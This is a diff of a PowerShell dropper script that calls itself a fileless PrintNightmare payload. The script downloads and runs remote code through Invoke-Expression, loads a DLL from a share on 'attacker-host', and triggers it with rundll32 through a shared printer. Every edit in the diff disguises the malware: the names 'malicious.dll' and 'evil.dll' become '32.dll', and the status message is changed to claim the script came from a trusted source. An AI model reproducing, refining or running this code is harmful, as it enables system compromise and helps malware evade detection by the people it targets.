@@ -1,5 +1,5 @@
 # === INITIAL DROPPER EXECUTION ===
-Write-Host "This script has been downloaded from a remote server and is executing..."
+Write-Host "This script has been downloaded fr0m a trusted source..."
 
 # Get system locale and culture
 $hostinfo = Get-Host
@@ -15,7 +15,7 @@ Invoke-Expression $downloadedScript
 # === STAGE 2: FILELESS PrintNightmare Payload ===
 $remoteShare = "\\attacker-host\printpayloads"
 $driverName = "PrintSpooferDriver"
-$dllName = "malicious.dll"
+$dllName = "32.dll"
 $printerEnv = "Windows x64"
 
 # Path for the malicious pplk.sys driver
@@ -89,7 +89,7 @@ if ($result) {
     Set-Printer -Name $printerName -Shared $true -Published $true
     Start-Sleep -Seconds 2
     Write-Host "[*] Triggering job via printer..."
-    Start-Process "rundll32.exe" "$spoolShare\evil.dll,SpoolerTrigger"
+    Start-Process "rundll32.exe" "$spoolShare\32.dll,SpoolerTrigger"
 
     Write-Host "[+] SpoolerFooler attempt completed."
 }
